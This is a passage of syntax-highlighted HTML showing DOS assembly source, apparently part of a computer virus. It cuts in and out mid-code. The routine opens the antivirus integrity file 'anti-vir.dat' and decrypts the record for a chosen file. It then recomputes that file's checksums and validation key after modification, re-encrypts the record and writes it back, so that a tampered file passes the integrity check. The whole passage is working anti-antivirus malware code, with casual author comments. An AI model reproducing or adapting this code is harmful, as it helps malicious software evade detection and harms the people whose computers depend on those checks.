</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; push 3 times 00</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                                      </span><span class="sc1">; sub entry of high size </span><span class="sc0">

</span><span class="sc5">loopingzero</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                                      </span><span class="sc1">; couting </span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ncounter</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">; the number of sections</span><span class="sc0">
                                                </span><span class="sc1">; to scan</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">loopingzero</span><span class="sc0">
 
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                                        </span><span class="sc1">; go on the first</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                                      </span><span class="sc1">;read 128 first bytes and store</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">+</span><span class="sc2">40h</span><span class="sc0">                                  </span><span class="sc1">; it into Build0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">build0</span><span class="sc0">                            </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">testfile</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">; I was drunk that day...</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">buildtable</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; get buildtable</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc2">30</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; here we test the name</span><span class="sc0">
</span><span class="sc5">loop0</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">; here I test if the name of</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">; the file is the good one</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">; in the good section</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">thatsOK</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">notOk</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop0</span><span class="sc0">                  </span><span class="sc1">; check every part</span><span class="sc0">

</span><span class="sc5">notOk</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">counter</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; if all section scanned ?</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ncounter</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">counter</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nohere</span><span class="sc0">                                       </span><span class="sc1">; yes ? ok , bye....</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buildtable</span><span class="sc0">                        </span><span class="sc1">; read next section</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">testfile</span><span class="sc0">

</span><span class="sc5">nohere</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                              </span><span class="sc1">; if not in the list , so</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                         </span><span class="sc1">; close anti-vir.dat</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                                             </span><span class="sc1">; tchao bella...</span><span class="sc0">

</span><span class="sc5">thatsOk</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">build0</span><span class="sc4">+</span><span class="sc2">56h</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; get the decryptor key</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">key</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">buildtable</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">; mov si the start of the </span><span class="sc0">
                                                </span><span class="sc1">; section</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                                      </span><span class="sc1">; read bozo tutorial</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">key</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">decryptloop</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; decrypt the zone</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; mathematical functions</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; I can't explain it anymore</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">                  </span><span class="sc1">; Wich this way of encryption</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; antivir.dat struct appears</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; totally out !</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">key</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">             
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">decryptloop</span><span class="sc0">                                 </span><span class="sc1">; loop here</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                                      </span><span class="sc1">; close the file</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d00h</span><span class="sc0">                                    </span><span class="sc1">; open the file in the buildt.</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">buildtable</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; open physically the file</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                                     </span><span class="sc1">; read 20h first bytes</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">buildtable</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                                        </span><span class="sc1">; go at the end</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">go</span><span class="sc0">
                                                </span><span class="sc1">; now ax = real size of the</span><span class="sc0">
                                                </span><span class="sc1">; file without modification</span><span class="sc0">
                                                </span><span class="sc1">; of the dta</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buildtable</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">; and save it here</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">go</span><span class="sc0">                                         </span><span class="sc1">; go on the entry of the file</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">start0</span><span class="sc4">]</span><span class="sc0">                                 </span><span class="sc1">; fix the first bytes of </span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">buildtable</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">; the entry-point</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                                         </span><span class="sc1">; in buildtable</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                                      </span><span class="sc1">; yeah , now , put</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buildtable</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; all the file in mem</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">temporary_seg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                       </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">calculation</span><span class="sc0">                                </span><span class="sc1">; and render checksums</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc5">finstore</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buildtable</span><span class="sc4">+</span><span class="sc2">2Eh</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">                </span><span class="sc1">; save checksums</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buildtable</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> 

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">buildtable</span><span class="sc4">]</span><span class="sc0">                             </span><span class="sc1">; rendering the Validation</span><span class="sc0">
                                                </span><span class="sc1">; key</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">03eh</span><span class="sc0">

</span><span class="sc5">pkt_loop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">do_the_xor</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0a097h</span><span class="sc0">
        </span><span class="sc6">js</span><span class="sc0"> </span><span class="sc5">do_the_xor</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">pkt_loop</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buildtable</span><span class="sc4">+</span><span class="sc2">3eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">; put the Validation key</span><span class="sc0">

</span><span class="sc5">encrypt</span><span class="sc4">:</span><span class="sc0"> 

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">buildtable</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">; all is Ok , encrypt the </span><span class="sc0">
                                                </span><span class="sc1">; section now !</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">key</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">encrypt_loop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">key</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">encrypt_loop</span><span class="sc0">        </span><span class="sc1">; invert than above</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                            </span><span class="sc1">; Open anti-vir.dat</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">010b</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">antiv</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                              </span><span class="sc1">; render position of the section</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">               
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">counter</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; get number of the section</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; and multiply it by 40</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">              </span><span class="sc1">; add 80h (128 first bytes)</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">; we have the right offset now!</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                            </span><span class="sc1">; go in it</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                              </span><span class="sc1">; write it</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buildtable</span><span class="sc0">        </span><span class="sc1">; go at buildtable offset</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                              </span><span class="sc1">; close</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">; return with all is Ok</span><span class="sc0">

</span><span class="sc5">calculation</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; render checksum</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                 </span><span class="sc1">; this is an important part </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buildtable</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; if u wanna understand</span><span class="sc0">
                    </span><span class="sc1">; go at Bozo tutorial</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">startit</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">krad1</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A097h</span><span class="sc0">

</span><span class="sc5">krad1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">krad2</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0a097h</span><span class="sc0">

</span><span class="sc5">krad2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
